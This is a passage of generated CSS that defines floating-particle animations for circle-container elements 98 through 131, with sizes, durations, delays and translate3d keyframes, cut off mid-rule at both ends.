  -webkit-animation-duration: 31287ms;
          animation-duration: 31287ms;
  -webkit-animation-delay: 34746ms;
          animation-delay: 34746ms;
}
@-webkit-keyframes move-frames-98 {
  from {
    -webkit-transform: translate3d(45vw, 101vh, 0);
            transform: translate3d(45vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(38vw, -131vh, 0);
            transform: translate3d(38vw, -131vh, 0);
  }
}
@keyframes move-frames-98 {
  from {
    -webkit-transform: translate3d(45vw, 101vh, 0);
            transform: translate3d(45vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(38vw, -131vh, 0);
            transform: translate3d(38vw, -131vh, 0);
  }
}
.circle-container:nth-child(98) .circle {
  -webkit-animation-delay: 854ms;
          animation-delay: 854ms;
}
.circle-container:nth-child(99) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-99;
          animation-name: move-frames-99;
  -webkit-animation-duration: 29593ms;
          animation-duration: 29593ms;
  -webkit-animation-delay: 32919ms;
          animation-delay: 32919ms;
}
@-webkit-keyframes move-frames-99 {
  from {
    -webkit-transform: translate3d(45vw, 103vh, 0);
            transform: translate3d(45vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(20vw, -108vh, 0);
            transform: translate3d(20vw, -108vh, 0);
  }
}
@keyframes move-frames-99 {
  from {
    -webkit-transform: translate3d(45vw, 103vh, 0);
            transform: translate3d(45vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(20vw, -108vh, 0);
            transform: translate3d(20vw, -108vh, 0);
  }
}
.circle-container:nth-child(99) .circle {
  -webkit-animation-delay: 3808ms;
          animation-delay: 3808ms;
}
.circle-container:nth-child(100) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-100;
          animation-name: move-frames-100;
  -webkit-animation-duration: 35638ms;
          animation-duration: 35638ms;
  -webkit-animation-delay: 16398ms;
          animation-delay: 16398ms;
}
@-webkit-keyframes move-frames-100 {
  from {
    -webkit-transform: translate3d(26vw, 110vh, 0);
            transform: translate3d(26vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(71vw, -135vh, 0);
            transform: translate3d(71vw, -135vh, 0);
  }
}
@keyframes move-frames-100 {
  from {
    -webkit-transform: translate3d(26vw, 110vh, 0);
            transform: translate3d(26vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(71vw, -135vh, 0);
            transform: translate3d(71vw, -135vh, 0);
  }
}
.circle-container:nth-child(100) .circle {
  -webkit-animation-delay: 2041ms;
          animation-delay: 2041ms;
}
.circle-container:nth-child(101) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-101;
          animation-name: move-frames-101;
  -webkit-animation-duration: 36243ms;
          animation-duration: 36243ms;
  -webkit-animation-delay: 36442ms;
          animation-delay: 36442ms;
}
@-webkit-keyframes move-frames-101 {
  from {
    -webkit-transform: translate3d(30vw, 104vh, 0);
            transform: translate3d(30vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(80vw, -117vh, 0);
            transform: translate3d(80vw, -117vh, 0);
  }
}
@keyframes move-frames-101 {
  from {
    -webkit-transform: translate3d(30vw, 104vh, 0);
            transform: translate3d(30vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(80vw, -117vh, 0);
            transform: translate3d(80vw, -117vh, 0);
  }
}
.circle-container:nth-child(101) .circle {
  -webkit-animation-delay: 2029ms;
          animation-delay: 2029ms;
}
.circle-container:nth-child(102) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-102;
          animation-name: move-frames-102;
  -webkit-animation-duration: 28837ms;
          animation-duration: 28837ms;
  -webkit-animation-delay: 26848ms;
          animation-delay: 26848ms;
}
@-webkit-keyframes move-frames-102 {
  from {
    -webkit-transform: translate3d(47vw, 101vh, 0);
            transform: translate3d(47vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(92vw, -121vh, 0);
            transform: translate3d(92vw, -121vh, 0);
  }
}
@keyframes move-frames-102 {
  from {
    -webkit-transform: translate3d(47vw, 101vh, 0);
            transform: translate3d(47vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(92vw, -121vh, 0);
            transform: translate3d(92vw, -121vh, 0);
  }
}
.circle-container:nth-child(102) .circle {
  -webkit-animation-delay: 634ms;
          animation-delay: 634ms;
}
.circle-container:nth-child(103) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-103;
          animation-name: move-frames-103;
  -webkit-animation-duration: 30226ms;
          animation-duration: 30226ms;
  -webkit-animation-delay: 26734ms;
          animation-delay: 26734ms;
}
@-webkit-keyframes move-frames-103 {
  from {
    -webkit-transform: translate3d(34vw, 107vh, 0);
            transform: translate3d(34vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(45vw, -121vh, 0);
            transform: translate3d(45vw, -121vh, 0);
  }
}
@keyframes move-frames-103 {
  from {
    -webkit-transform: translate3d(34vw, 107vh, 0);
            transform: translate3d(34vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(45vw, -121vh, 0);
            transform: translate3d(45vw, -121vh, 0);
  }
}
.circle-container:nth-child(103) .circle {
  -webkit-animation-delay: 2386ms;
          animation-delay: 2386ms;
}
.circle-container:nth-child(104) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-104;
          animation-name: move-frames-104;
  -webkit-animation-duration: 35891ms;
          animation-duration: 35891ms;
  -webkit-animation-delay: 10816ms;
          animation-delay: 10816ms;
}
@-webkit-keyframes move-frames-104 {
  from {
    -webkit-transform: translate3d(74vw, 103vh, 0);
            transform: translate3d(74vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(10vw, -108vh, 0);
            transform: translate3d(10vw, -108vh, 0);
  }
}
@keyframes move-frames-104 {
  from {
    -webkit-transform: translate3d(74vw, 103vh, 0);
            transform: translate3d(74vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(10vw, -108vh, 0);
            transform: translate3d(10vw, -108vh, 0);
  }
}
.circle-container:nth-child(104) .circle {
  -webkit-animation-delay: 2582ms;
          animation-delay: 2582ms;
}
.circle-container:nth-child(105) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-105;
          animation-name: move-frames-105;
  -webkit-animation-duration: 36670ms;
          animation-duration: 36670ms;
  -webkit-animation-delay: 29277ms;
          animation-delay: 29277ms;
}
@-webkit-keyframes move-frames-105 {
  from {
    -webkit-transform: translate3d(69vw, 105vh, 0);
            transform: translate3d(69vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(42vw, -120vh, 0);
            transform: translate3d(42vw, -120vh, 0);
  }
}
@keyframes move-frames-105 {
  from {
    -webkit-transform: translate3d(69vw, 105vh, 0);
            transform: translate3d(69vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(42vw, -120vh, 0);
            transform: translate3d(42vw, -120vh, 0);
  }
}
.circle-container:nth-child(105) .circle {
  -webkit-animation-delay: 545ms;
          animation-delay: 545ms;
}
.circle-container:nth-child(106) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-106;
          animation-name: move-frames-106;
  -webkit-animation-duration: 32861ms;
          animation-duration: 32861ms;
  -webkit-animation-delay: 6276ms;
          animation-delay: 6276ms;
}
@-webkit-keyframes move-frames-106 {
  from {
    -webkit-transform: translate3d(25vw, 103vh, 0);
            transform: translate3d(25vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(98vw, -117vh, 0);
            transform: translate3d(98vw, -117vh, 0);
  }
}
@keyframes move-frames-106 {
  from {
    -webkit-transform: translate3d(25vw, 103vh, 0);
            transform: translate3d(25vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(98vw, -117vh, 0);
            transform: translate3d(98vw, -117vh, 0);
  }
}
.circle-container:nth-child(106) .circle {
  -webkit-animation-delay: 2787ms;
          animation-delay: 2787ms;
}
.circle-container:nth-child(107) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-107;
          animation-name: move-frames-107;
  -webkit-animation-duration: 30528ms;
          animation-duration: 30528ms;
  -webkit-animation-delay: 8060ms;
          animation-delay: 8060ms;
}
@-webkit-keyframes move-frames-107 {
  from {
    -webkit-transform: translate3d(97vw, 104vh, 0);
            transform: translate3d(97vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(17vw, -129vh, 0);
            transform: translate3d(17vw, -129vh, 0);
  }
}
@keyframes move-frames-107 {
  from {
    -webkit-transform: translate3d(97vw, 104vh, 0);
            transform: translate3d(97vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(17vw, -129vh, 0);
            transform: translate3d(17vw, -129vh, 0);
  }
}
.circle-container:nth-child(107) .circle {
  -webkit-animation-delay: 1060ms;
          animation-delay: 1060ms;
}
.circle-container:nth-child(108) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-108;
          animation-name: move-frames-108;
  -webkit-animation-duration: 36227ms;
          animation-duration: 36227ms;
  -webkit-animation-delay: 27149ms;
          animation-delay: 27149ms;
}
@-webkit-keyframes move-frames-108 {
  from {
    -webkit-transform: translate3d(23vw, 102vh, 0);
            transform: translate3d(23vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(50vw, -111vh, 0);
            transform: translate3d(50vw, -111vh, 0);
  }
}
@keyframes move-frames-108 {
  from {
    -webkit-transform: translate3d(23vw, 102vh, 0);
            transform: translate3d(23vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(50vw, -111vh, 0);
            transform: translate3d(50vw, -111vh, 0);
  }
}
.circle-container:nth-child(108) .circle {
  -webkit-animation-delay: 2915ms;
          animation-delay: 2915ms;
}
.circle-container:nth-child(109) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-109;
          animation-name: move-frames-109;
  -webkit-animation-duration: 32393ms;
          animation-duration: 32393ms;
  -webkit-animation-delay: 21003ms;
          animation-delay: 21003ms;
}
@-webkit-keyframes move-frames-109 {
  from {
    -webkit-transform: translate3d(73vw, 106vh, 0);
            transform: translate3d(73vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(45vw, -130vh, 0);
            transform: translate3d(45vw, -130vh, 0);
  }
}
@keyframes move-frames-109 {
  from {
    -webkit-transform: translate3d(73vw, 106vh, 0);
            transform: translate3d(73vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(45vw, -130vh, 0);
            transform: translate3d(45vw, -130vh, 0);
  }
}
.circle-container:nth-child(109) .circle {
  -webkit-animation-delay: 3047ms;
          animation-delay: 3047ms;
}
.circle-container:nth-child(110) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-110;
          animation-name: move-frames-110;
  -webkit-animation-duration: 36405ms;
          animation-duration: 36405ms;
  -webkit-animation-delay: 11862ms;
          animation-delay: 11862ms;
}
@-webkit-keyframes move-frames-110 {
  from {
    -webkit-transform: translate3d(28vw, 104vh, 0);
            transform: translate3d(28vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(8vw, -127vh, 0);
            transform: translate3d(8vw, -127vh, 0);
  }
}
@keyframes move-frames-110 {
  from {
    -webkit-transform: translate3d(28vw, 104vh, 0);
            transform: translate3d(28vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(8vw, -127vh, 0);
            transform: translate3d(8vw, -127vh, 0);
  }
}
.circle-container:nth-child(110) .circle {
  -webkit-animation-delay: 2765ms;
          animation-delay: 2765ms;
}
.circle-container:nth-child(111) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-111;
          animation-name: move-frames-111;
  -webkit-animation-duration: 28029ms;
          animation-duration: 28029ms;
  -webkit-animation-delay: 21050ms;
          animation-delay: 21050ms;
}
@-webkit-keyframes move-frames-111 {
  from {
    -webkit-transform: translate3d(45vw, 103vh, 0);
            transform: translate3d(45vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(48vw, -111vh, 0);
            transform: translate3d(48vw, -111vh, 0);
  }
}
@keyframes move-frames-111 {
  from {
    -webkit-transform: translate3d(45vw, 103vh, 0);
            transform: translate3d(45vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(48vw, -111vh, 0);
            transform: translate3d(48vw, -111vh, 0);
  }
}
.circle-container:nth-child(111) .circle {
  -webkit-animation-delay: 2257ms;
          animation-delay: 2257ms;
}
.circle-container:nth-child(112) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-112;
          animation-name: move-frames-112;
  -webkit-animation-duration: 28861ms;
          animation-duration: 28861ms;
  -webkit-animation-delay: 5668ms;
          animation-delay: 5668ms;
}
@-webkit-keyframes move-frames-112 {
  from {
    -webkit-transform: translate3d(46vw, 101vh, 0);
            transform: translate3d(46vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(44vw, -131vh, 0);
            transform: translate3d(44vw, -131vh, 0);
  }
}
@keyframes move-frames-112 {
  from {
    -webkit-transform: translate3d(46vw, 101vh, 0);
            transform: translate3d(46vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(44vw, -131vh, 0);
            transform: translate3d(44vw, -131vh, 0);
  }
}
.circle-container:nth-child(112) .circle {
  -webkit-animation-delay: 2326ms;
          animation-delay: 2326ms;
}
.circle-container:nth-child(113) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-113;
          animation-name: move-frames-113;
  -webkit-animation-duration: 35496ms;
          animation-duration: 35496ms;
  -webkit-animation-delay: 30223ms;
          animation-delay: 30223ms;
}
@-webkit-keyframes move-frames-113 {
  from {
    -webkit-transform: translate3d(51vw, 105vh, 0);
            transform: translate3d(51vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(26vw, -117vh, 0);
            transform: translate3d(26vw, -117vh, 0);
  }
}
@keyframes move-frames-113 {
  from {
    -webkit-transform: translate3d(51vw, 105vh, 0);
            transform: translate3d(51vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(26vw, -117vh, 0);
            transform: translate3d(26vw, -117vh, 0);
  }
}
.circle-container:nth-child(113) .circle {
  -webkit-animation-delay: 3622ms;
          animation-delay: 3622ms;
}
.circle-container:nth-child(114) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-114;
          animation-name: move-frames-114;
  -webkit-animation-duration: 34947ms;
          animation-duration: 34947ms;
  -webkit-animation-delay: 16085ms;
          animation-delay: 16085ms;
}
@-webkit-keyframes move-frames-114 {
  from {
    -webkit-transform: translate3d(51vw, 101vh, 0);
            transform: translate3d(51vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(80vw, -108vh, 0);
            transform: translate3d(80vw, -108vh, 0);
  }
}
@keyframes move-frames-114 {
  from {
    -webkit-transform: translate3d(51vw, 101vh, 0);
            transform: translate3d(51vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(80vw, -108vh, 0);
            transform: translate3d(80vw, -108vh, 0);
  }
}
.circle-container:nth-child(114) .circle {
  -webkit-animation-delay: 7ms;
          animation-delay: 7ms;
}
.circle-container:nth-child(115) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-115;
          animation-name: move-frames-115;
  -webkit-animation-duration: 28967ms;
          animation-duration: 28967ms;
  -webkit-animation-delay: 29984ms;
          animation-delay: 29984ms;
}
@-webkit-keyframes move-frames-115 {
  from {
    -webkit-transform: translate3d(41vw, 108vh, 0);
            transform: translate3d(41vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(8vw, -122vh, 0);
            transform: translate3d(8vw, -122vh, 0);
  }
}
@keyframes move-frames-115 {
  from {
    -webkit-transform: translate3d(41vw, 108vh, 0);
            transform: translate3d(41vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(8vw, -122vh, 0);
            transform: translate3d(8vw, -122vh, 0);
  }
}
.circle-container:nth-child(115) .circle {
  -webkit-animation-delay: 3490ms;
          animation-delay: 3490ms;
}
.circle-container:nth-child(116) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-116;
          animation-name: move-frames-116;
  -webkit-animation-duration: 28547ms;
          animation-duration: 28547ms;
  -webkit-animation-delay: 29049ms;
          animation-delay: 29049ms;
}
@-webkit-keyframes move-frames-116 {
  from {
    -webkit-transform: translate3d(67vw, 105vh, 0);
            transform: translate3d(67vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(62vw, -113vh, 0);
            transform: translate3d(62vw, -113vh, 0);
  }
}
@keyframes move-frames-116 {
  from {
    -webkit-transform: translate3d(67vw, 105vh, 0);
            transform: translate3d(67vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(62vw, -113vh, 0);
            transform: translate3d(62vw, -113vh, 0);
  }
}
.circle-container:nth-child(116) .circle {
  -webkit-animation-delay: 3264ms;
          animation-delay: 3264ms;
}
.circle-container:nth-child(117) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-117;
          animation-name: move-frames-117;
  -webkit-animation-duration: 29250ms;
          animation-duration: 29250ms;
  -webkit-animation-delay: 20464ms;
          animation-delay: 20464ms;
}
@-webkit-keyframes move-frames-117 {
  from {
    -webkit-transform: translate3d(75vw, 105vh, 0);
            transform: translate3d(75vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(92vw, -109vh, 0);
            transform: translate3d(92vw, -109vh, 0);
  }
}
@keyframes move-frames-117 {
  from {
    -webkit-transform: translate3d(75vw, 105vh, 0);
            transform: translate3d(75vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(92vw, -109vh, 0);
            transform: translate3d(92vw, -109vh, 0);
  }
}
.circle-container:nth-child(117) .circle {
  -webkit-animation-delay: 2868ms;
          animation-delay: 2868ms;
}
.circle-container:nth-child(118) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-118;
          animation-name: move-frames-118;
  -webkit-animation-duration: 36705ms;
          animation-duration: 36705ms;
  -webkit-animation-delay: 36468ms;
          animation-delay: 36468ms;
}
@-webkit-keyframes move-frames-118 {
  from {
    -webkit-transform: translate3d(92vw, 110vh, 0);
            transform: translate3d(92vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(65vw, -124vh, 0);
            transform: translate3d(65vw, -124vh, 0);
  }
}
@keyframes move-frames-118 {
  from {
    -webkit-transform: translate3d(92vw, 110vh, 0);
            transform: translate3d(92vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(65vw, -124vh, 0);
            transform: translate3d(65vw, -124vh, 0);
  }
}
.circle-container:nth-child(118) .circle {
  -webkit-animation-delay: 497ms;
          animation-delay: 497ms;
}
.circle-container:nth-child(119) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-119;
          animation-name: move-frames-119;
  -webkit-animation-duration: 35064ms;
          animation-duration: 35064ms;
  -webkit-animation-delay: 15735ms;
          animation-delay: 15735ms;
}
@-webkit-keyframes move-frames-119 {
  from {
    -webkit-transform: translate3d(58vw, 109vh, 0);
            transform: translate3d(58vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(1vw, -113vh, 0);
            transform: translate3d(1vw, -113vh, 0);
  }
}
@keyframes move-frames-119 {
  from {
    -webkit-transform: translate3d(58vw, 109vh, 0);
            transform: translate3d(58vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(1vw, -113vh, 0);
            transform: translate3d(1vw, -113vh, 0);
  }
}
.circle-container:nth-child(119) .circle {
  -webkit-animation-delay: 2148ms;
          animation-delay: 2148ms;
}
.circle-container:nth-child(120) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-120;
          animation-name: move-frames-120;
  -webkit-animation-duration: 30769ms;
          animation-duration: 30769ms;
  -webkit-animation-delay: 33087ms;
          animation-delay: 33087ms;
}
@-webkit-keyframes move-frames-120 {
  from {
    -webkit-transform: translate3d(12vw, 110vh, 0);
            transform: translate3d(12vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(3vw, -124vh, 0);
            transform: translate3d(3vw, -124vh, 0);
  }
}
@keyframes move-frames-120 {
  from {
    -webkit-transform: translate3d(12vw, 110vh, 0);
            transform: translate3d(12vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(3vw, -124vh, 0);
            transform: translate3d(3vw, -124vh, 0);
  }
}
.circle-container:nth-child(120) .circle {
  -webkit-animation-delay: 3592ms;
          animation-delay: 3592ms;
}
.circle-container:nth-child(121) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-121;
          animation-name: move-frames-121;
  -webkit-animation-duration: 34748ms;
          animation-duration: 34748ms;
  -webkit-animation-delay: 20510ms;
          animation-delay: 20510ms;
}
@-webkit-keyframes move-frames-121 {
  from {
    -webkit-transform: translate3d(100vw, 102vh, 0);
            transform: translate3d(100vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(81vw, -132vh, 0);
            transform: translate3d(81vw, -132vh, 0);
  }
}
@keyframes move-frames-121 {
  from {
    -webkit-transform: translate3d(100vw, 102vh, 0);
            transform: translate3d(100vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(81vw, -132vh, 0);
            transform: translate3d(81vw, -132vh, 0);
  }
}
.circle-container:nth-child(121) .circle {
  -webkit-animation-delay: 587ms;
          animation-delay: 587ms;
}
.circle-container:nth-child(122) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-122;
          animation-name: move-frames-122;
  -webkit-animation-duration: 30606ms;
          animation-duration: 30606ms;
  -webkit-animation-delay: 7277ms;
          animation-delay: 7277ms;
}
@-webkit-keyframes move-frames-122 {
  from {
    -webkit-transform: translate3d(39vw, 103vh, 0);
            transform: translate3d(39vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(43vw, -119vh, 0);
            transform: translate3d(43vw, -119vh, 0);
  }
}
@keyframes move-frames-122 {
  from {
    -webkit-transform: translate3d(39vw, 103vh, 0);
            transform: translate3d(39vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(43vw, -119vh, 0);
            transform: translate3d(43vw, -119vh, 0);
  }
}
.circle-container:nth-child(122) .circle {
  -webkit-animation-delay: 1226ms;
          animation-delay: 1226ms;
}
.circle-container:nth-child(123) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-123;
          animation-name: move-frames-123;
  -webkit-animation-duration: 32779ms;
          animation-duration: 32779ms;
  -webkit-animation-delay: 26503ms;
          animation-delay: 26503ms;
}
@-webkit-keyframes move-frames-123 {
  from {
    -webkit-transform: translate3d(25vw, 103vh, 0);
            transform: translate3d(25vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(41vw, -127vh, 0);
            transform: translate3d(41vw, -127vh, 0);
  }
}
@keyframes move-frames-123 {
  from {
    -webkit-transform: translate3d(25vw, 103vh, 0);
            transform: translate3d(25vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(41vw, -127vh, 0);
            transform: translate3d(41vw, -127vh, 0);
  }
}
.circle-container:nth-child(123) .circle {
  -webkit-animation-delay: 825ms;
          animation-delay: 825ms;
}
.circle-container:nth-child(124) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-124;
          animation-name: move-frames-124;
  -webkit-animation-duration: 36870ms;
          animation-duration: 36870ms;
  -webkit-animation-delay: 32002ms;
          animation-delay: 32002ms;
}
@-webkit-keyframes move-frames-124 {
  from {
    -webkit-transform: translate3d(36vw, 101vh, 0);
            transform: translate3d(36vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(44vw, -124vh, 0);
            transform: translate3d(44vw, -124vh, 0);
  }
}
@keyframes move-frames-124 {
  from {
    -webkit-transform: translate3d(36vw, 101vh, 0);
            transform: translate3d(36vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(44vw, -124vh, 0);
            transform: translate3d(44vw, -124vh, 0);
  }
}
.circle-container:nth-child(124) .circle {
  -webkit-animation-delay: 450ms;
          animation-delay: 450ms;
}
.circle-container:nth-child(125) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-125;
          animation-name: move-frames-125;
  -webkit-animation-duration: 30249ms;
          animation-duration: 30249ms;
  -webkit-animation-delay: 26667ms;
          animation-delay: 26667ms;
}
@-webkit-keyframes move-frames-125 {
  from {
    -webkit-transform: translate3d(41vw, 106vh, 0);
            transform: translate3d(41vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(30vw, -124vh, 0);
            transform: translate3d(30vw, -124vh, 0);
  }
}
@keyframes move-frames-125 {
  from {
    -webkit-transform: translate3d(41vw, 106vh, 0);
            transform: translate3d(41vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(30vw, -124vh, 0);
            transform: translate3d(30vw, -124vh, 0);
  }
}
.circle-container:nth-child(125) .circle {
  -webkit-animation-delay: 72ms;
          animation-delay: 72ms;
}
.circle-container:nth-child(126) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-126;
          animation-name: move-frames-126;
  -webkit-animation-duration: 35282ms;
          animation-duration: 35282ms;
  -webkit-animation-delay: 34750ms;
          animation-delay: 34750ms;
}
@-webkit-keyframes move-frames-126 {
  from {
    -webkit-transform: translate3d(10vw, 106vh, 0);
            transform: translate3d(10vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(65vw, -118vh, 0);
            transform: translate3d(65vw, -118vh, 0);
  }
}
@keyframes move-frames-126 {
  from {
    -webkit-transform: translate3d(10vw, 106vh, 0);
            transform: translate3d(10vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(65vw, -118vh, 0);
            transform: translate3d(65vw, -118vh, 0);
  }
}
.circle-container:nth-child(126) .circle {
  -webkit-animation-delay: 1330ms;
          animation-delay: 1330ms;
}
.circle-container:nth-child(127) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-127;
          animation-name: move-frames-127;
  -webkit-animation-duration: 29994ms;
          animation-duration: 29994ms;
  -webkit-animation-delay: 29650ms;
          animation-delay: 29650ms;
}
@-webkit-keyframes move-frames-127 {
  from {
    -webkit-transform: translate3d(49vw, 102vh, 0);
            transform: translate3d(49vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(6vw, -113vh, 0);
            transform: translate3d(6vw, -113vh, 0);
  }
}
@keyframes move-frames-127 {
  from {
    -webkit-transform: translate3d(49vw, 102vh, 0);
            transform: translate3d(49vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(6vw, -113vh, 0);
            transform: translate3d(6vw, -113vh, 0);
  }
}
.circle-container:nth-child(127) .circle {
  -webkit-animation-delay: 386ms;
          animation-delay: 386ms;
}
.circle-container:nth-child(128) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-128;
          animation-name: move-frames-128;
  -webkit-animation-duration: 32128ms;
          animation-duration: 32128ms;
  -webkit-animation-delay: 14435ms;
          animation-delay: 14435ms;
}
@-webkit-keyframes move-frames-128 {
  from {
    -webkit-transform: translate3d(35vw, 102vh, 0);
            transform: translate3d(35vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(12vw, -116vh, 0);
            transform: translate3d(12vw, -116vh, 0);
  }
}
@keyframes move-frames-128 {
  from {
    -webkit-transform: translate3d(35vw, 102vh, 0);
            transform: translate3d(35vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(12vw, -116vh, 0);
            transform: translate3d(12vw, -116vh, 0);
  }
}
.circle-container:nth-child(128) .circle {
  -webkit-animation-delay: 1628ms;
          animation-delay: 1628ms;
}
.circle-container:nth-child(129) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-129;
          animation-name: move-frames-129;
  -webkit-animation-duration: 28679ms;
          animation-duration: 28679ms;
  -webkit-animation-delay: 11415ms;
          animation-delay: 11415ms;
}
@-webkit-keyframes move-frames-129 {
  from {
    -webkit-transform: translate3d(46vw, 102vh, 0);
            transform: translate3d(46vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(75vw, -103vh, 0);
            transform: translate3d(75vw, -103vh, 0);
  }
}
@keyframes move-frames-129 {
  from {
    -webkit-transform: translate3d(46vw, 102vh, 0);
            transform: translate3d(46vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(75vw, -103vh, 0);
            transform: translate3d(75vw, -103vh, 0);
  }
}
.circle-container:nth-child(129) .circle {
  -webkit-animation-delay: 2605ms;
          animation-delay: 2605ms;
}
.circle-container:nth-child(130) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-130;
          animation-name: move-frames-130;
  -webkit-animation-duration: 33830ms;
          animation-duration: 33830ms;
  -webkit-animation-delay: 30096ms;
          animation-delay: 30096ms;
}
@-webkit-keyframes move-frames-130 {
  from {
    -webkit-transform: translate3d(36vw, 104vh, 0);
            transform: translate3d(36vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(67vw, -107vh, 0);
            transform: translate3d(67vw, -107vh, 0);
  }
}
@keyframes move-frames-130 {
  from {
    -webkit-transform: translate3d(36vw, 104vh, 0);
            transform: translate3d(36vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(67vw, -107vh, 0);
            transform: translate3d(67vw, -107vh, 0);
  }
}
.circle-container:nth-child(130) .circle {
  -webkit-animation-delay: 3067ms;
          animation-delay: 3067ms;
}
.circle-container:nth-child(131) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-131;
          animation-name: move-frames-131;
  -webkit-animation-duration: 32975ms;
          animation-duration: 32975ms;
  -webkit-animation-delay: 17275ms;
          animation-delay: 17275ms;
}
@-webkit-keyframes move-frames-131 {
  from {
    -webkit-transform: translate3d(62vw, 108vh, 0);
            transform: translate3d(62vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(87vw, -112vh, 0);
            transform: translate3d(87vw, -112vh, 0);
  }
}
@keyframes move-frames-131 {
  from {
    -webkit-transform: translate3d(62vw, 108vh, 0);
            transform: translate3d(62vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(87vw, -112vh, 0);
